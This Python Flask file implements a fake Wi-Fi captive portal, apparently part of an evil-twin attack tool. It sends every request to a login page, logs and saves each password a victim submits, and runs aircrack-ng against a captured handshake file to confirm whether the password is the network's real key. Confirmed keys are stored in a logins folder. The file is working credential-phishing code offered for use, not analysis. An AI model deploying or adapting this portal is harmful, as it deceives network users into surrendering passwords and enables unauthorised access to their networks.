from flask import Flask, request, redirect, url_for, render_template, flash, send_from_directory
import sys
from subprocess import Popen, PIPE, STDOUT
import os
import random
import string
import threading
from time import sleep

app = Flask(__name__, template_folder=os.path.join(os.path.dirname(__file__), '../templates'), static_folder=os.path.join(os.path.dirname(__file__), '../static'))
app.secret_key = "spaghetti"
app.logger.setLevel(10)
portal_name = ' '.join(sys.argv[1:]) if len(sys.argv) > 1 else 'Default Portal'

def log_running():
    while True:
        app.logger.debug("Running DEBUG")
        sleep(3)

# Start the logging thread
threading.Thread(target=log_running, daemon=True).start()

@app.route('/')
def index():
    return redirect(url_for('login'))

@app.route('/webfonts/<path:filename>')
def webfonts(filename):
    return send_from_directory(os.path.join(app.root_path, '../static/webfonts'), filename)

@app.route('/<path:path>')
def catch_all(path):
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        password = request.form.get('password')
        app.logger.info(f'Password: {password}')
        file_name = os.path.join(os.path.dirname(__file__), "../hashes/" + ''.join(random.choices(string.ascii_letters + string.digits, k=16)) + ".txt")
        with open(file_name, 'w') as f:
            f.write(password)
        command = f"aircrack-ng {os.path.join(os.path.dirname(__file__), '../hashes/' + portal_name.replace(' ', '_') + '.pcap')} -w {file_name}"
        aircrack = Popen(command, shell=True, stdout=PIPE, stderr=STDOUT)
        aircrack.wait()
        os.remove(file_name)
        output = aircrack.stdout.readlines()

        cracked = False
        for line in output:
            line = line.decode()
            app.logger.debug(line)
            if 'KEY FOUND' in line:
                cracked = True

        if cracked:
            app.logger.info("KEY FOUND!!! " + password)
            file = os.path.join(os.path.dirname(__file__), "../logins/" + portal_name.replace(" ", "_"))
            with open(file, "w") as f:
                f.write(password)
            return 'Login successful. You can now close this page.'
        else:
            flash('Incorrect credentials, please try again.')
            return redirect(url_for('login'))
    else:
        app.logger.info('GET request received: ' + request.remote_addr)
        return render_template('captive.html', portal_name=portal_name)
    
if __name__ == '__main__':
    app.logger.info("Flask started")
    app.run('0.0.0.0', 80, debug=True)
